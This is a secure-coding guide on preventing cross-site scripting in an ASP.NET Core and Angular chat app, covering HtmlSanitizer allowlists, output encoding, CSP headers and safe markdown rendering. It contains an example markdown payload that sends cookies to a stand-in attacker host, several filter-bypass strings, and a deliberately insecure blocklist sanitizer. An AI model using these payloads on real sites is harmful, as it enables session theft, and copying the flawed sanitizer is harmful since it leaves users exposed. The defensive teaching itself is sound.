# XSS Prevention
> Verified against: .NET 9 | C# 13 | ASP.NET Core 9.x | HtmlSanitizer 8.x
> Last reviewed: 2026-02-22

## The Law
Never render user-supplied content as raw HTML — encode all output at the rendering layer and sanitize rich text input at the ingestion layer using an allowlist, not a blocklist.

## Why This Kills You At Scale
A single stored XSS payload in a chat message executes in every viewer's browser — at 100k users in a group chat, one message steals 100k session cookies simultaneously. The attacker does not need to target users individually; they send one message and wait. Cookie theft via XSS bypasses HttpOnly? No — but script injection can make authenticated API calls as the victim without needing the cookie directly.

## The Pattern

```csharp
#nullable enable
using Ganss.Xss; // HtmlSanitizer package
using System.Text.Encodings.Web;

// ✅ Correct: sanitize rich text at ingestion — before storage
public sealed class MessageSanitizer
{
    private static readonly HtmlSanitizer Sanitizer = CreateSanitizer();

    private static HtmlSanitizer CreateSanitizer()
    {
        var sanitizer = new HtmlSanitizer();

        // Allowlist approach: clear defaults, add only what you permit
        sanitizer.AllowedTags.Clear();
        sanitizer.AllowedTags.Add("b");
        sanitizer.AllowedTags.Add("i");
        sanitizer.AllowedTags.Add("u");
        sanitizer.AllowedTags.Add("a");
        sanitizer.AllowedTags.Add("br");
        sanitizer.AllowedTags.Add("p");

        sanitizer.AllowedAttributes.Clear();
        sanitizer.AllowedAttributes.Add("href"); // Only on <a>

        // ✅ Only allow safe URL schemes — block javascript:, data:, vbscript:
        sanitizer.AllowedSchemes.Clear();
        sanitizer.AllowedSchemes.Add("https");
        sanitizer.AllowedSchemes.Add("http");

        // Prevent CSS injection
        sanitizer.AllowedCssProperties.Clear();

        return sanitizer;
    }

    // ✅ Sanitize before storing — not at display time
    // Storing sanitized content means display is always safe, even in new contexts
    public string SanitizeHtml(string? input)
    {
        if (string.IsNullOrWhiteSpace(input)) return string.Empty;
        return Sanitizer.Sanitize(input);
    }

    // ✅ For plain text messages: HTML encode, do not sanitize
    // Encoding is safer than sanitization for plain text — preserves content exactly
    public string EncodeForHtml(string? input)
    {
        if (string.IsNullOrWhiteSpace(input)) return string.Empty;
        return HtmlEncoder.Default.Encode(input);
    }
}

// ✅ Correct: in service layer — sanitize before saving to DB
public sealed class MessageService(MessageSanitizer sanitizer)
{
    public async Task<MessageDto> CreateAsync(CreateMessageRequest request, CancellationToken ct)
    {
        // Plain text messages: encode, do not sanitize HTML
        // (sanitizing plain text can mangle legitimate content like <userId>)
        var safeContent = request.IsRichText
            ? sanitizer.SanitizeHtml(request.Content)
            : request.Content; // Plain text is encoded at render time by Angular

        var message = new Message { Content = safeContent };
        // ... save and return
        return message.ToDto();
    }
}

// ✅ Correct: API returns data, not HTML — Angular handles encoding
// Angular's {{ }} interpolation HTML-encodes by default
// [innerHTML] requires explicit trust — document every use of DomSanitizer.bypassSecurityTrust*

// ✅ Correct: Content Security Policy header — defense in depth
// Even if XSS occurs, CSP prevents script execution from unknown sources
app.Use(async (context, next) =>
{
    context.Response.Headers.Append(
        "Content-Security-Policy",
        "default-src 'self'; " +
        "script-src 'self'; " +          // No inline scripts, no CDN unless explicitly listed
        "style-src 'self'; " +
        "img-src 'self' data: https:; " +
        "connect-src 'self' wss:; " +    // Allow WebSocket for SignalR
        "frame-ancestors 'none'");        // Prevent clickjacking
    await next();
});

// ❌ Wrong: blocklist approach — always incomplete
public class InsecureSanitizer
{
    public string Sanitize(string input)
    {
        // Attackers bypass this with: <scr<script>ipt>, <SCRIPT>, &#60;script&#62;
        return input
            .Replace("<script>", "")
            .Replace("</script>", "")
            .Replace("javascript:", ""); // Bypassed with: java&#115;cript:
    }
}
```

## The Trap

```csharp
// A senior developer correctly sanitizes content on ingestion.
// Stored content is safe. The Angular app uses {{ }} everywhere.
// Works perfectly. Ships.

// The trap: a new feature adds markdown rendering.
// Developer uses a markdown library that converts to HTML client-side.
// The stored text is never sanitized for HTML injection via markdown.

// Attacker sends: [click me](javascript:fetch('https://evil.com/steal?c='+document.cookie))
// Markdown parser converts to: <a href="javascript:fetch(...)">click me</a>
// If the Angular markdown component uses [innerHTML] without sanitization — XSS.

// Fix: sanitize the HTML OUTPUT of the markdown parser, not the markdown input.
// The markdown input is safe (it's just text). The HTML output is dangerous.

// Server-side: Markdig (C# markdown parser) + HtmlSanitizer pipeline
using Markdig;
using Ganss.Xss;

public sealed class MarkdownService
{
    private static readonly MarkdownPipeline Pipeline = new MarkdownPipelineBuilder()
        .UseAdvancedExtensions()
        .DisableHtml() // ✅ Prevents raw HTML in markdown from passing through
        .Build();

    private static readonly HtmlSanitizer Sanitizer = CreateSanitizer();

    public string RenderSafe(string markdownInput)
    {
        // Parse markdown to HTML
        var html = Markdown.ToHtml(markdownInput, Pipeline);
        // Sanitize the resulting HTML — catches anything DisableHtml missed
        return Sanitizer.Sanitize(html);
    }
}
```

## The Exception
Internal admin dashboards that render markdown or HTML exclusively for authenticated admin users with no user-supplied content display — CSP and encoding are still required, but allowlist sanitization of every field may be relaxed. However, the moment any user-supplied content (usernames, profile bios, message previews) appears in the admin UI, full sanitization applies. Admin UIs are the most common source of second-order XSS.

## Before You Merge
- Is every user-supplied string that will be rendered as HTML passing through `HtmlSanitizer` with an allowlist before storage?
- Is the Content-Security-Policy header set with `script-src 'self'` — no `unsafe-inline`, no `unsafe-eval`?
- Does the markdown rendering pipeline sanitize the HTML output — not the markdown input?
- Are all Angular template interpolations using `{{ }}` — with `[innerHTML]` uses documented and reviewed?
- Is `javascript:` excluded from the `AllowedSchemes` in the HTML sanitizer?
